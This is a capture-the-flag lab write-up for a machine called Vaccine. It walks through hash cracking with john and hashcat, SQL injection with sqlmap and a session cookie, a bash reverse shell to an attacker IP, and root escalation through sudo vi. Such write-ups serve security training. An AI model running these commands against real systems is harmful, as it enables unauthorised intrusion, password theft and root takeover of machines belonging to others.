# Vaccine

## Summary

This is a pretty complicated one, involving Hash Cracking, SQL Injection, and Linux Privesc with vi sudo access  
First, we crack an encrypted zip's hash, then we obtain a admin php user hash, which we crack  
This gives us access to a website login  
We use sqlmap and Cookie-Editor to inject sql commands  
This enables us to get a reverse shell, where we quickly find the plaintext password for postgres user, which allows us to login with ssh  
Finally, we use a vi sudo vulnerability to escalate privleges and obtain a root shell

## Enumeration

nmap shows that ports 21,22,80 are open  
21 is ftp, and -sC shows us that Anonymous FTP login is allowed with username anonymous  
We can grab a password protected zip file called backups.zip from the ftp server

## Hash Cracking

We can use a john the ripper script called zip2john to generate a hash from a password protected zip in a format to allow for cracking attempts: `zip2john backups.zip > hashes`  
Then, run john the ripper:  
`john -wordlist=/usr/share/wordlists/rockyou.txt hashes`
`john -show hashes` shows us that john has cracked the hash  
Using this password to unzip the zip shows us a hash of an admin password in the index.php file  
We can attempt to determine what type of hash this is with: `hashid <hash>` or in our case `hashid 2cb42f8734ea607eefed3b70af13bbd3`  
This gives us a number of potetial hash types, one of which is MD5  
`echo '2cb42f8734ea607eefed3b70af13bbd3' > hash`  
Attempt to crack the hash with hashcat: `hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt`  
- `-m` specifies the hashtype, 0 is MD5  

This gives us the password in plaintext  
Hashcat and JtR are very similar tools and for my current understanding can be used interchangibly

## Web Enumeration

We can login to the website with our admin credentials now  
From here, we can enumerate sql injection possibilities  
We can use a firefox extension called Cookie-Editor to get our cookie  
Then, run sql map:  
`sqlmap -u 'http://10.129.64.242/dashboard.php?search=any+query' --cookie="PHPSESSID=4loa43cu3oua054lfnlrd7kpi2"`  
The output of this command shows that the target is vulnerable to sql injection. Therefore, we can run:  
`sqlmap -u 'http://10.129.64.242/dashboard.php?search=any+query' --cookie="PHPSESSID=4loa43cu3oua054lfnlrd7kpi2" --os-shell`
to perform command injection  
Setup a netcat listener on 443: `nc -lvnp 443`  
Then, we inject the command: `bash -c "bash -i >& /dev/tcp/10.10.15.135/443 0>&1"` to connect to our listener  
This shell is very unstable, so we want to act quick  
We will try to find our password in the /var/www/html folder, since the machine uses both PHP and SQL, meaning there should be credentials in clear text  
Once we have the password for postgres, we can use ssh to connect instead, which is more stable

## Privlege Escalation

typing `sudo -l` to see what privleges we do have: we find that we have sudo privleges to edit the pg_hba.conf file using vi by running  
`sudo /bin/vi /etc/postgres/11/main/pg_hba.conf`  
We can go to **GTFOBins** to see if we can abuse this privlege  
Turns out we can: run vi as super user, and use the vi command (:) to run `:set shell=/bin/sh`  
Then, run `:shell` which gives us a shell as root